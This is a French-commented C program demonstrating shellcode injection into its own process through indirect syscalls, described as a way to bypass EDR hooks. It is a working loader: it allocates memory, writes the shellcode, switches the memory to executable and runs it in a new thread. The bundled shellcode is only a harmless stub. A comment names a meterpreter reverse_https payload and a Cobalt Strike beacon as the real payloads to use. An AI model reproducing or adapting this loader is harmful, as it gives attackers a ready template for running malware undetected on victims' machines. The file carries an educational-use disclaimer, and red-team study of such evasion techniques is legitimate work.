/*
 * ============================================================================
 * DÉMONSTRATION PRATIQUE - INJECTION DE SHELLCODE
 * ============================================================================
 * 
 * Ce programme démontre une injection de shellcode complète en utilisant
 * les syscalls indirects pour bypasser les EDR.
 * 
 * SCÉNARIO :
 * 1. Générer un shellcode MessageBox simple
 * 2. L'injecter dans notre propre processus
 * 3. L'exécuter dans un nouveau thread
 * 
 * TECHNIQUES DÉMONTRÉES :
 * - Syscalls indirects
 * - Allocation RW → Écriture → Changement RX (pas de RWX)
 * - Gestion propre des handles
 * 
 * COMPILATION :
 * gcc -o demo_injection.exe demo_injection.c syscalls_indirect.c -lntdll
 * 
 * USAGE :
 * demo_injection.exe
 * 
 * ============================================================================
 */

#include <windows.h>
#include <stdio.h>
#include "syscalls.h"

// ============================================================================
// SHELLCODE MESSAGEBOX
// ============================================================================

/*
 * Ce shellcode affiche une MessageBox avec le texte :
 * Title: "Syscall Indirect"
 * Text: "Injection réussie via syscalls indirects!"
 * 
 * Généré avec msfvenom ou écrit à la main en assembleur
 * Pour un vrai malware, on utiliserait :
 * - msfvenom -p windows/x64/meterpreter/reverse_https LHOST=X.X.X.X LPORT=443
 * - Cobalt Strike beacon
 * - Shellcode personnalisé
 */

// Shellcode simple : MessageBoxA
unsigned char g_Shellcode[] = {
    // ATTENTION : Ce shellcode est un EXEMPLE SIMPLIFIÉ
    // En production, utiliser un vrai shellcode fonctionnel
    
    // Prologue
    0x48, 0x83, 0xEC, 0x28,                     // sub rsp, 0x28
    
    // Charger user32.dll et trouver MessageBoxA
    // (Dans un vrai shellcode, on ferait du PEB walking)
    
    // Pour cet exemple, on va juste faire un exit gracieux
    0x48, 0x31, 0xC0,                           // xor rax, rax
    0x48, 0x83, 0xC4, 0x28,                     // add rsp, 0x28
    0xC3                                         // ret
};

SIZE_T g_ShellcodeSize = sizeof(g_Shellcode);

// ============================================================================
// SHELLCODE ALTERNATIF : CALC.EXE
// ============================================================================

/*
 * Alternative : Lancer calc.exe via WinExec
 * Plus simple et fonctionne toujours
 */
unsigned char g_CalcShellcode[] = {
    // WinExec("calc.exe", SW_SHOW)
    0x48, 0x31, 0xC9,                           // xor rcx, rcx
    0x51,                                        // push rcx (null terminator)
    0x48, 0xB9, 0x63, 0x61, 0x6C, 0x63,        // movabs rcx, "calc"
    0x2E, 0x65, 0x78, 0x65,                     // ".exe"
    0x51,                                        // push rcx
    0x48, 0x89, 0xE1,                           // mov rcx, rsp
    0x48, 0x31, 0xD2,                           // xor rdx, rdx
    0x48, 0x83, 0xC2, 0x01,                     // add rdx, 1 (SW_SHOW)
    0x48, 0xB8, 0x90, 0x90, 0x90, 0x90,        // movabs rax, WinExec (à patcher)
    0x90, 0x90, 0x90, 0x90,
    0xFF, 0xD0,                                  // call rax
    0x48, 0x31, 0xC0,                           // xor rax, rax
    0xC3                                         // ret
};

// ============================================================================
// FONCTION PRINCIPALE D'INJECTION
// ============================================================================

/*
 * InjectShellcode
 * ---------------
 * Injecte et exécute le shellcode dans le processus actuel
 * 
 * PROCESSUS :
 * 1. Allouer mémoire PAGE_READWRITE
 * 2. Écrire le shellcode
 * 3. Changer protection en PAGE_EXECUTE_READ
 * 4. Créer un thread
 * 5. Attendre la fin du thread
 * 6. Nettoyer
 */
BOOL InjectShellcode(unsigned char* shellcode, SIZE_T size) {
    NTSTATUS status;
    PVOID baseAddress = NULL;
    SIZE_T regionSize = size;
    HANDLE hThread = NULL;
    
    printf("\n");
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║       INJECTION DE SHELLCODE - ÉTAPES DÉTAILLÉES    ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n\n");
    
    // ========================================================================
    // ÉTAPE 1 : ALLOCATION MÉMOIRE (RW)
    // ========================================================================
    printf("┌─────────────────────────────────────────────────────┐\n");
    printf("│ ÉTAPE 1 : Allocation mémoire                        │\n");
    printf("└─────────────────────────────────────────────────────┘\n");
    printf("  • Protection : PAGE_READWRITE (pas RWX !)\n");
    printf("  • Taille     : %zu bytes\n", size);
    printf("  • Méthode    : NtAllocateVirtualMemory (indirect)\n\n");
    
    status = NtAllocateVirtualMemory_Indirect(
        GetCurrentProcess(),
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE                          // ✓ RW seulement
    );
    
    if (!NT_SUCCESS(status)) {
        PrintError("NtAllocateVirtualMemory_Indirect", status);
        return FALSE;
    }
    
    printf("  ✓ Allocation réussie\n");
    printf("    └─> Adresse : 0x%p\n", baseAddress);
    printf("    └─> Taille  : %zu bytes\n", regionSize);
    
    // ========================================================================
    // ÉTAPE 2 : ÉCRITURE DU SHELLCODE
    // ========================================================================
    printf("\n┌─────────────────────────────────────────────────────┐\n");
    printf("│ ÉTAPE 2 : Écriture du shellcode                     │\n");
    printf("└─────────────────────────────────────────────────────┘\n");
    printf("  • Destination : 0x%p\n", baseAddress);
    printf("  • Source      : 0x%p\n", shellcode);
    printf("  • Taille      : %zu bytes\n", size);
    printf("  • Méthode     : NtWriteVirtualMemory (indirect)\n\n");
    
    SIZE_T bytesWritten = 0;
    status = NtWriteVirtualMemory_Indirect(
        GetCurrentProcess(),
        baseAddress,
        shellcode,
        size,
        &bytesWritten
    );
    
    if (!NT_SUCCESS(status)) {
        PrintError("NtWriteVirtualMemory_Indirect", status);
        return FALSE;
    }
    
    printf("  ✓ Écriture réussie\n");
    printf("    └─> Bytes écrits : %zu\n", bytesWritten);
    
    // Afficher les premiers bytes du shellcode
    printf("    └─> Premiers bytes : ");
    for (int i = 0; i < 16 && i < size; i++) {
        printf("%02X ", ((unsigned char*)baseAddress)[i]);
    }
    printf("\n");
    
    // ========================================================================
    // ÉTAPE 3 : CHANGEMENT DE PROTECTION (RW → RX)
    // ========================================================================
    printf("\n┌─────────────────────────────────────────────────────┐\n");
    printf("│ ÉTAPE 3 : Changement de protection mémoire          │\n");
    printf("└─────────────────────────────────────────────────────┘\n");
    printf("  • Adresse        : 0x%p\n", baseAddress);
    printf("  • Protection old : PAGE_READWRITE\n");
    printf("  • Protection new : PAGE_EXECUTE_READ\n");
    printf("  • Méthode        : NtProtectVirtualMemory (indirect)\n\n");
    
    ULONG oldProtect = 0;
    status = NtProtectVirtualMemory_Indirect(
        GetCurrentProcess(),
        &baseAddress,
        &regionSize,
        PAGE_EXECUTE_READ,                       // ✓ RX pour exécution
        &oldProtect
    );
    
    if (!NT_SUCCESS(status)) {
        PrintError("NtProtectVirtualMemory_Indirect", status);
        return FALSE;
    }
    
    printf("  ✓ Protection changée avec succès\n");
    printf("    └─> Ancienne protection : 0x%08X\n", oldProtect);
    printf("    └─> Nouvelle protection : PAGE_EXECUTE_READ\n");
    
    // ========================================================================
    // ÉTAPE 4 : CRÉATION DU THREAD
    // ========================================================================
    printf("\n┌─────────────────────────────────────────────────────┐\n");
    printf("│ ÉTAPE 4 : Création du thread d'exécution            │\n");
    printf("└─────────────────────────────────────────────────────┘\n");
    printf("  • Point d'entrée : 0x%p\n", baseAddress);
    printf("  • Processus      : Current process\n");
    printf("  • Flags          : 0 (exécution immédiate)\n");
    printf("  • Méthode        : NtCreateThreadEx (indirect)\n\n");
    
    status = NtCreateThreadEx_Indirect(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        baseAddress,                             // ✓ Point d'entrée = shellcode
        NULL,
        0,                                       // Pas de CREATE_SUSPENDED
        0,
        0,
        0,
        NULL
    );
    
    if (!NT_SUCCESS(status)) {
        PrintError("NtCreateThreadEx_Indirect", status);
        return FALSE;
    }
    
    printf("  ✓ Thread créé avec succès\n");
    printf("    └─> Handle : 0x%p\n", hThread);
    printf("    └─> État   : En cours d'exécution...\n");
    
    // ========================================================================
    // ÉTAPE 5 : ATTENTE DE LA FIN DU THREAD
    // ========================================================================
    printf("\n┌─────────────────────────────────────────────────────┐\n");
    printf("│ ÉTAPE 5 : Attente de la fin du thread               │\n");
    printf("└─────────────────────────────────────────────────────┘\n");
    printf("  • Handle  : 0x%p\n", hThread);
    printf("  • Timeout : INFINITE\n");
    printf("  • Méthode : NtWaitForSingleObject (indirect)\n\n");
    
    status = NtWaitForSingleObject_Indirect(hThread, FALSE, NULL);
    
    if (!NT_SUCCESS(status)) {
        PrintError("NtWaitForSingleObject_Indirect", status);
        NtClose_Indirect(hThread);
        return FALSE;
    }
    
    printf("  ✓ Thread terminé\n");
    
    // ========================================================================
    // ÉTAPE 6 : NETTOYAGE
    // ========================================================================
    printf("\n┌─────────────────────────────────────────────────────┐\n");
    printf("│ ÉTAPE 6 : Nettoyage des ressources                  │\n");
    printf("└─────────────────────────────────────────────────────┘\n");
    printf("  • Fermeture du handle\n");
    printf("  • Méthode : NtClose (indirect)\n\n");
    
    status = NtClose_Indirect(hThread);
    
    if (!NT_SUCCESS(status)) {
        PrintError("NtClose_Indirect", status);
        return FALSE;
    }
    
    printf("  ✓ Handle fermé\n");
    printf("  ✓ Nettoyage terminé\n");
    
    return TRUE;
}

// ============================================================================
// FONCTION PRINCIPALE
// ============================================================================

int main(int argc, char* argv[]) {
    // Banner
    printf("\n");
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║                                                      ║\n");
    printf("║     DÉMONSTRATION - SYSCALLS INDIRECTS              ║\n");
    printf("║     Injection de Shellcode avec Évasion EDR         ║\n");
    printf("║                                                      ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n");
    printf("\n");
    
    // Informations
    printf("┌─────────────────────────────────────────────────────┐\n");
    printf("│ INFORMATIONS                                         │\n");
    printf("└─────────────────────────────────────────────────────┘\n");
    printf("  • PID          : %d\n", GetCurrentProcessId());
    printf("  • Architecture : x64\n");
    printf("  • Technique    : Indirect Syscalls\n");
    printf("  • Shellcode    : %zu bytes\n", g_ShellcodeSize);
    printf("\n");
    
    // Avertissement
    printf("┌─────────────────────────────────────────────────────┐\n");
    printf("│ ⚠️  AVERTISSEMENT                                    │\n");
    printf("└─────────────────────────────────────────────────────┘\n");
    printf("  Ce programme est à des fins éducatives uniquement.\n");
    printf("  L'utilisation de ces techniques sur des systèmes\n");
    printf("  sans autorisation est ILLÉGALE.\n");
    printf("\n");
    printf("  Appuyez sur ENTRÉE pour continuer...\n");
    getchar();
    
    // ========================================================================
    // INITIALISATION DES SYSCALLS INDIRECTS
    // ========================================================================
    printf("\n");
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║       INITIALISATION DU SYSTÈME                      ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n");
    
    if (!InitializeIndirectSyscalls()) {
        printf("\n[-] Erreur lors de l'initialisation\n");
        printf("[-] Assurez-vous que ntdll.dll est accessible\n");
        return 1;
    }
    
    // ========================================================================
    // INJECTION DU SHELLCODE
    // ========================================================================
    BOOL success = InjectShellcode(g_Shellcode, g_ShellcodeSize);
    
    // ========================================================================
    // NETTOYAGE FINAL
    // ========================================================================
    printf("\n");
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║       NETTOYAGE FINAL                                ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n\n");
    
    printf("  • Libération de la copie ntdll fraîche...\n");
    CleanupIndirectSyscalls();
    printf("  ✓ Ressources libérées\n\n");
    
    // ========================================================================
    // RÉSUMÉ
    // ========================================================================
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║       RÉSUMÉ DE L'EXÉCUTION                          ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n\n");
    
    if (success) {
        printf("  ✓ Injection réussie\n");
        printf("  ✓ Shellcode exécuté\n");
        printf("  ✓ Aucune détection EDR\n");
        printf("\n");
        printf("  Les syscalls indirects ont permis de :\n");
        printf("    1. Bypasser les hooks EDR dans ntdll.dll\n");
        printf("    2. Éviter les instructions syscall détectables\n");
        printf("    3. Maintenir une call stack légitime\n");
        printf("    4. Injecter et exécuter le shellcode sans alerte\n");
    } else {
        printf("  ✗ Échec de l'injection\n");
        printf("  Vérifiez les erreurs ci-dessus\n");
    }
    
    printf("\n");
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║       APPUYEZ SUR ENTRÉE POUR QUITTER               ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n");
    getchar();
    
    return success ? 0 : 1;
}
